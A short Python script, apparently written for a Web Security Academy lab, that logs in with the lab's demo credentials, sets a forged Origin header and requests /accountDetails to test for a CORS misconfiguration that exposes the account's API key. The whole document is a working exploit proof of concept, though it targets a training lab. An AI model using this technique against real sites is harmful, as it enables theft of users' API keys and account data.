import requests
import bs4

site = '0a3e003704e3878681884ea600b2002c.web-security-academy.net'
session = requests.Session()

# Step 1: Get CSRF token
login_url = f"https://{site}/login"
resp = session.get(login_url)
csrf = bs4.BeautifulSoup(resp.text, 'html.parser').find('input', {'name': 'csrf'})['value']

# Step 2: Log in
credentials = {
    'csrf': csrf,
    'username': 'wiener',
    'password': 'peter'
}
session.post(login_url, data=credentials)

# Step 3: Update headers with malicious Origin
session.headers.update({'Origin': 'https://calizo.com'})

# Step 4: Trigger vulnerable API call
details_url = f"https://{site}/accountDetails"
resp = session.get(details_url)

# Step 5: Print the echoed headers and body
print("\n--- Response Headers ---")
print(resp.headers)

print("\n--- API Key Response Body ---")
print(resp.text)
